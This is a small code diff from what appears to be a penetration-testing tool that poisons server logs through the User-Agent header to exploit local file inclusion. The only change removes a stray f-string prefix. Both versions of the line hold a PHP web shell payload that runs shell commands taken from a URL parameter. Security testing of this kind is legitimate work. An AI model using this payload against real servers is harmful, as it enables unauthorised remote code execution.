@@ -172,7 +172,7 @@ class LfiLogInjectTool(Tool):
         ]
 
         # 注入恶意 UA
-        ua_payload = f"<?php echo 'LFI_RCE_START'; system($_GET['c']); echo 'LFI_RCE_END'; ?>"
+        ua_payload = "<?php echo 'LFI_RCE_START'; system($_GET['c']); echo 'LFI_RCE_END'; ?>"
         results: list[str] = []
 
         for lp in log_paths:
